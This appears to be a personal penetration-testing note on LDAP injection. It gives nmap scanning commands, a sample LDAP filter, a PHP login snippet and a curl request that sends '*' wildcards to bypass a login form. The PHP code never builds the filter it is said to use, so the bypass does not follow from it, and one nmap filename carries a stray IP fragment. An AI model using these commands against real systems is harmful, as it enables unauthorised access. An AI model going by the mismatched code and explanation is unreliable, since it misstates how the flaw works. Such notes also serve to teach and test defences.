---
Primary_category: "[[WEB ATTACKS]]"
title: "LDAP INJECTION"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Enumeration*

##### *Port Scanning*

First, we have to carry out a port scanning in order to know which ports are listening on the target and see if an *LDAP* service is running on it

To do so, we can proceed as follows

- ***Basic Scan***

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG <TARGET>.129.205.18.allPorts <TARGET>
```

- ***Comprehensive Scan***

```bash
nmap -p"$( grep -ioP --color -- '\s\d{1,5}(?=/open)' <TARGET>.allPorts | xargs | sed 's@\s@,@g' )" -sV -sC -v -n -Pn --disable-arp-ping -oN <TARGET>.targeted <TARGET>
```

---

#### *Exploitation*

Let's imagine we are dealing with a web application that presents a login form. In this case we do not have any valid credentials to log in the application

However, we have enumerated the target previously and we saw that the port *389* is open, which typically means that an *LDAP* service is running

Therefore, the login form feature probably uses *LDAP* to query the given directory service in order to validate the client authentication

If so, let's assume that the web application does the following search query

##### *Search Query*

```bash
(&(objectClass=User)(username=$username)(password=$password))
```

##### *Vulnerable Code*

```php
if (isset($_GET['username'], $_GET['password']))
{
	$ldap = ldap_connect('ldap://localhost');
	ldap_set_option($ldap, LDAP_OPT_PROTOCOL_VERSION, 3);
	ldap_bind($ldap, $_GET['username'], $_GET['password']);
}
else {
	die("User or password not specified");
}
```

##### *Payload*

Given the following vulnerable code, since the user input, namely the value provided for the *username* and *password* *HTTP* parameters, is not neither being validated nor sanitized, we can send the following payload

```bash
curl --silent --location --request GET '<URL>/login.php?username=*&password=*'
```

The * character matches with any existing username and password within the directory service to which the web application connects, so the given authentication will be successful

---

#### *Resources*

***[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)***